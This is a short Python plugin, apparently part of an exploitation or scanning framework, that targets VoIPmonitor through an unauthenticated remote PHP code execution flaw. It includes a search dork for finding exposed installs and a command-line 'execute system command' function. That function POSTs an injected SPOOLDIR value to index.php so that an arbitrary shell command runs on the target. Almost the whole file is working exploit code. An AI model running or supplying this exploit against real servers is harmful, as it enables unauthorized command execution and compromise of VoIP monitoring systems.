# -*-* coding:UTF-8
import urllib.parse


class Plugin(Base):
    __info__ = {
        "name": "VoIPMonitor未授权远程代码执行漏洞",
        "dork": "title=\"VoIPmonitor\"",
        "description": "VoIPmonitor是具有在Linux上运行的SIP RTP和RTCP VoIP协议的具有商业前端的开源网络数据包嗅探器。使用通过Web界面到达的用户提供的数据，允许未经身份验证的远程用户触发VoIPmonitor中的远程PHP代码执行漏洞",
        "references": ["-"],
    }

    def url(self) -> dict:
        random_str = self.build_random_str(12)
        res = self.exec_cmd(self.target.value, f"echo {random_str}")
        if res and random_str in res:
            return {"LoopholeInfo": self.__info__}

    @cli.command(description='执行系统命令')
    @cli.options("url", help="攻击的目标", default="{self.target.value}")
    @cli.options("cmd", help="执行的命令", default="whoami")
    def exec_cmd(self, url, cmd):
        r = self.request(
            method='post',
            url=urllib.parse.urljoin(url, './index.php'), timeout=15,
            data=f'SPOOLDIR=test".system("{cmd}")."&recheck=annen',
        )
        if r.status_code == 200:
            return r.text
